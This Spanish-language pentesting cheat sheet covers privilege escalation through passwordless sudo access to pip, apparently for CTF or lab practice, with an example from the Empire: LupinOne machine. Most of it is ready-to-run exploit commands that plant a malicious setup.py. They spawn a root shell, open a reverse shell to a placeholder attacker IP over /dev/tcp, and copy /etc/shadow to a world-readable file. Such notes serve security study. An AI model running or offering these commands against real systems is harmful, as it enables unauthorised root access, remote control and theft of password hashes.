# Escalada de Privilegios via pip

## Descripción

Si un usuario puede ejecutar `pip` como root mediante sudo sin contraseña, puede instalar un paquete Python malicioso que ejecute comandos como root. pip ejecuta el archivo `setup.py` del paquete durante la instalación, y si ese archivo contiene código malicioso, se ejecuta con los privilegios de pip.

---

## Detección

Aparece en la salida de `sudo -l`:

```
(root) NOPASSWD: /usr/bin/pip
(root) NOPASSWD: /usr/bin/pip3
(root) NOPASSWD: /usr/local/bin/pip
```

---

## Explotación — shell interactiva 

Tres comandos exactos de GTFOBins:

```shell
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

**Explicación:**
1. `mktemp -d` → crea un directorio temporal
2. Se escribe un `setup.py` malicioso que lanza una shell
3. `sudo pip install` → pip ejecuta `setup.py` como root

---

## Explotación — reverse shell

```shell
TF=$(mktemp -d)
echo "import os; os.system('bash -c \"bash -i >& /dev/tcp/KALI_IP/4444 0>&1\"')" > $TF/setup.py
sudo pip install $TF
```

---

## Explotación — leer archivos protegidos

```shell
TF=$(mktemp -d)
echo "import os; os.system('cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow')" > $TF/setup.py
sudo pip install $TF
cat /tmp/shadow
```

---

## Referencia

Técnica documentada en GTFOBins: `https://gtfobins.github.io/gtfobins/pip/`

---

## Ejemplo real — Máquina Empire: LupinOne

Como usuario arsene con `sudo pip` sin contraseña:

```shell
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
whoami
# root ✅
```
